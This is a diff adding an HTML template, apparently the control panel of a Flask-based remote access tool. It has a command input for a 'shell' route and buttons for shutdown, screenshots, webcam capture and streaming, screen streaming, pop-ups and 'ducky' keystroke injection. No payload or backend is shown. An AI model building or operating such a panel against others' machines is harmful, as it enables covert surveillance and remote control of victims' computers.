@@ -1,0 +1,117 @@
+<head>
+    <title>Shell</title>
+    <link rel="icon" type="image/x-icon" href="{{ url_for('static', filename='images/favicon.ico') }}">
+    <style>
+        h1 {
+            color: white;
+            background-color: black;
+            font-family: 'Courier New',monospace;
+        }
+        body {
+            background-color: black;
+            font-family: 'Courier New',monospace;
+        }
+        textarea {
+            resize: none;
+            width: 100%;
+            font-family: 'Courier New', monospace;
+            color: white;
+            background-color: black;
+        }
+        input {
+            background-color: black;
+            border: 0;
+            border-color: black;
+            color: white;
+        }
+        label {
+            color: white;
+            background-color: black;
+        }
+        .action_table {
+            position: absolute;
+            background-color: black;
+            bottom: 0;
+            right: 0;
+        }
+    </style>
+{% with messages = get_flashed_messages() %}
+{% if messages %}
+    <script>
+      var messages = {{ messages | safe }};
+      for (var i=0; i<messages.length; i++) {
+        alert(messages[i]);
+        console.log(messages[i])
+      }
+    </script>
+  {% endif %}
+{% endwith %}
+</head>
+<body>
+
+    <script>
+        function testJS(){
+            var a = document.getElementById("test");
+            a.value = "http://";
+        }
+
+        var input = document.getElementById("input_cmd");
+        input.addEventListener("keypress", function(event) {
+          if (event.key === "Enter") {
+            event.preventDefault();
+            document.getElementById("submitButton").click();
+          }
+        });
+    </script>
+
+    <h1>{path}</h1>
+    <textarea name="output_text" id="output_text" wrap="hard" style="height: 30%">{output_square_text}</textarea>
+    <form action="{{ url_for('shell')}}" method="POST">
+        <input type="text" id="input_cmd" name="input_cmd" style="width: 100%; font-family: 'Courier New', monospace; height: 3vw; border: 0 solid black;" autofocus="autofocus">
+        <input type="submit" id="submitButton" style="visibility: hidden;">
+        <table class="action_table" border="0">
+            <tr>
+                <td>
+                    <button name="shutdown_button" type="submit" value="shutdown_button" style="background-color: black; border: 0;">
+                        <img  style="width: 40px; height: 40px;" src="{{ url_for('static', filename='images/shutdown.png') }}" >
+                    </button>
+                </td>
+                <td>
+                    <button name="cancel_shutdown_button" type="submit" value="cancel_shutdown_button" style="background-color: black; border: 0;">
+                        <img style=" width: 40px; height: 40px;" src="{{ url_for('static', filename='images/cancel_shutdown.png') }}">
+                    </button>
+                </td>
+                <td>
+                    <button name="download_screenshot" type="submit" value="download_screenshot" style="background-color: black; border: 0;">
+                        <img style=" width: 40px; height: 40px;" src="{{ url_for('static', filename='images/downloadscreenshot.png') }}">
+                    </button>
+                </td>
+                <td>
+                    <button name="download_pic" type="submit" value="download_pic" style="background-color: black; border: 0;">
+                        <img style=" width: 40px; height: 40px;" src="{{ url_for('static', filename='images/downloadpicture.png') }}">
+                    </button>
+                </td>
+                <td>
+                    <button name="webcam_stream" type="submit" value="webcam_stream" style="background-color: black; border: 0;">
+                        <img style=" width: 40px; height: 40px;" src="{{ url_for('static', filename='images/recording.png') }}">
+                    </button>
+                </td>
+                <td>
+                    <button name="screen_stream" type="submit" value="screen_stream" style="background-color: black; border: 0;">
+                        <img style=" width: 40px; height: 40px;" src="{{ url_for('static', filename='images/screenrecording.png') }}">
+                    </button>
+                </td>
+                <td>
+                    <button value="pop-up" name="pop-up" type="submit" style="background-color: black; border: 0;">
+                        <img style="height: 40px; width: 40px;" src="{{ url_for('static', filename='images/popup-white.png') }}">
+                    </button>
+                </td>
+                <td>
+                    <button name="ducky" type="submit" value="ducky" style="background-color: black; border: 0;">
+                        <img  style="width: 40px; height: 40px;" src="{{ url_for('static', filename='images/ducky.png') }}" >
+                    </button>
+                </td>
+            </tr>
+        </table>
+    </form>
+</body>
